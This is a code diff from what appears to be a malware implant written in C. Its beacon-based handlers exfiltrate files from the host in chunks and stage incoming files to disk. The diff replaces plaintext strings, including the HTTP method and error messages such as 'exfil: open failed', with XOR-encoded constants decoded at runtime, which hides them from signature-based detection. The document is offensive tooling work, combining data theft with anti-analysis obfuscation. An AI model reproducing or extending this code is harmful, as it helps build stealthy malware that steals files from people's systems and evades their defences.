@@ -64,8 +64,11 @@ static void send_result_raw(uint32_t beacon_id, uint32_t label,
     char path[64];
     xor_dec(path, ENC_PATH_RESULT, ENC_PATH_RESULT_LEN);
 
+    char _method[ENC_HTTP_POST_LEN + 1];
+    xor_dec(_method, ENC_HTTP_POST, ENC_HTTP_POST_LEN);
+
     uint8_t resp[64];
-    http_request("POST", path, body, body_len, resp, sizeof(resp));
+    http_request(_method, path, body, body_len, resp, sizeof(resp));
     free(body);
 }
 
@@ -119,8 +122,11 @@ static void send_error(uint32_t beacon_id, uint32_t label,
     char path[64];
     xor_dec(path, ENC_PATH_RESULT, ENC_PATH_RESULT_LEN);
 
+    char _method[ENC_HTTP_POST_LEN + 1];
+    xor_dec(_method, ENC_HTTP_POST, ENC_HTTP_POST_LEN);
+
     uint8_t resp[64];
-    http_request("POST", path, body, body_len, resp, sizeof(resp));
+    http_request(_method, path, body, body_len, resp, sizeof(resp));
     free(body);
 }
 
@@ -132,8 +138,10 @@ void handle_file_exfil(uint32_t beacon_id, uint32_t label,
                        int session_sock) {
     FILE *fp = fopen(src_path, "rb");
     if (!fp) {
+        char _fmt[ENC_LX_EXFIL_ERR_OPEN_LEN + 1];
+        xor_dec(_fmt, ENC_LX_EXFIL_ERR_OPEN, ENC_LX_EXFIL_ERR_OPEN_LEN);
         char msg[256];
-        snprintf(msg, sizeof(msg), "exfil: open failed (%s)", strerror(errno));
+        snprintf(msg, sizeof(msg), _fmt, strerror(errno));
         send_error(beacon_id, label, msg, session_key, session_sock);
         return;
     }
@@ -149,7 +157,9 @@ void handle_file_exfil(uint32_t beacon_id, uint32_t label,
     struct stat st;
     if (fstat(fileno(fp), &st) != 0) {
         fclose(fp);
-        send_error(beacon_id, label, "exfil: stat failed", session_key, session_sock);
+        char _stat_err[ENC_LX_EXFIL_ERR_STAT_LEN + 1];
+        xor_dec(_stat_err, ENC_LX_EXFIL_ERR_STAT, ENC_LX_EXFIL_ERR_STAT_LEN);
+        send_error(beacon_id, label, _stat_err, session_key, session_sock);
         return;
     }
     long long total = st.st_size;
@@ -186,8 +196,10 @@ void handle_file_exfil(uint32_t beacon_id, uint32_t label,
 
         size_t bytes_read = fread(chunk_buf + prefix, 1, to_read, fp);
         if (bytes_read == 0) {
+            char _rfmt[ENC_LX_EXFIL_ERR_READ_LEN + 1];
+            xor_dec(_rfmt, ENC_LX_EXFIL_ERR_READ, ENC_LX_EXFIL_ERR_READ_LEN);
             char msg[256];
-            snprintf(msg, sizeof(msg), "exfil: read failed (%s)", strerror(errno));
+            snprintf(msg, sizeof(msg), _rfmt, strerror(errno));
             send_error(beacon_id, label, msg, session_key, session_sock);
             break;
         }
@@ -249,8 +261,10 @@ void handle_file_stage(uint32_t beacon_id, uint32_t label,
 
         FILE *fp = fopen(dest_path, "wb");
         if (!fp) {
+            char _sfmt[ENC_LX_STAGE_ERR_CREATE_LEN + 1];
+            xor_dec(_sfmt, ENC_LX_STAGE_ERR_CREATE, ENC_LX_STAGE_ERR_CREATE_LEN);
             char msg[512];
-            snprintf(msg, sizeof(msg), "stage: cannot create '%s' (%s)", dest_path, strerror(errno));
+            snprintf(msg, sizeof(msg), _sfmt, dest_path, strerror(errno));
             send_error(beacon_id, label, msg, session_key, session_sock);
             return;
         }
